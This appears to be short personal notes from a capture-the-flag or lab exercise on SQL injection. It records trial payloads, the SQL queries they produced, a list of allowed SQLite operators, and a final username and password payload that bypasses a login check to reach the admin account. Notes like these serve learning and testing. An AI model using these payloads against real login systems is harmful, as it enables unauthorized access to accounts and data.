# SQL Injection

this payload

```
' || ''-'
```

got this output

```
SELECT username, password FROM users WHERE username='' || ''-'' AND password='' || ''-''
```

SELECT username, password FROM users WHERE username=''||'a'||'dmin' AND password='qd'
SELECT username, password FROM users WHERE username='a'||'dmin' AND password='qd'

concat not working for some reason

so this works for the admin part

```sql
SELECT username, password FROM users WHERE username='adm'||'in' AND password='arast' IS NOT 'a' IS 'a'
```

# Available SQL Operators

```
+ addition
- subtraction
% modulus
BETWEEN
EXISTS
IN
NOT IN
LIKE
GLOB
NOT
OR
IS NULL
IS
IS NOT
||
UNIQUE
| bitwise or
& bitwise and
```

# Payload

username:`ad'||'min`
password:`a' IS NOT 'b`
